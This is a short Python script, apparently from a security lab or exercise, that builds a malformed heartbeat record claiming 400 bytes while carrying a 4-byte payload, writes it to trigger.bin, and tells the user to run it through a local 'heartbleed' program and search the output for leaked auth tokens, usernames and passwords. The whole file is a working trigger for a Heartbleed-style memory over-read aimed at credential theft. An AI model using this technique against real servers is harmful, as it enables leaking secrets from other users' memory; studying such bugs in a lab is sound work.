#!/usr/bin/env python3
"""Create a malicious heartbeat record that triggers the Heartbleed-style leak."""
import struct

HEARTBEAT_REQUEST = 1
real_payload = b"PING"
claimed_len  = 400          # much larger than the 4-byte real payload

record = struct.pack(">BH", HEARTBEAT_REQUEST, claimed_len) + real_payload

with open("trigger.bin", "wb") as f:
    f.write(record)

print(f"Wrote trigger.bin: {len(real_payload)} bytes of real payload, "
      f"claims {claimed_len} bytes")
print()
print("Run:  ./heartbleed trigger.bin | xxd | head -30")
print("Look for leaked strings: auth_token, username, password")
